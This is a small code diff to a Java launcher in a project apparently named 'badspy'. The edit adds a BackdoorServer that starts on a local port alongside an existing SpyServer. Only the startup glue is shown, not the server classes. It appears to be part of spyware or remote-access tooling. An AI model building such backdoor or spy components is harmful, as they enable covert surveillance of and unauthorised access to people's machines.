@@ -1,5 +1,6 @@
 package com.blogspot.sontx.badspy.badserver;
 
+import com.blogspot.sontx.badspy.badserver.bo.BackdoorServer;
 import com.blogspot.sontx.badspy.badserver.bo.SpyServer;
 
 import java.io.IOException;
@@ -11,8 +12,10 @@ import java.io.IOException;
 public final class Program {
     public static void main(String[] args) {
         try {
-            SpyServer server = new SpyServer("localhost", 2512);
-            server.start();
+            SpyServer spyServer = new SpyServer("localhost", 2512);
+            BackdoorServer backdoorServer = new BackdoorServer("localhost", 3393);
+            spyServer.start();
+            backdoorServer.start();
             System.in.read();
         } catch (IOException e) {
             e.printStackTrace();
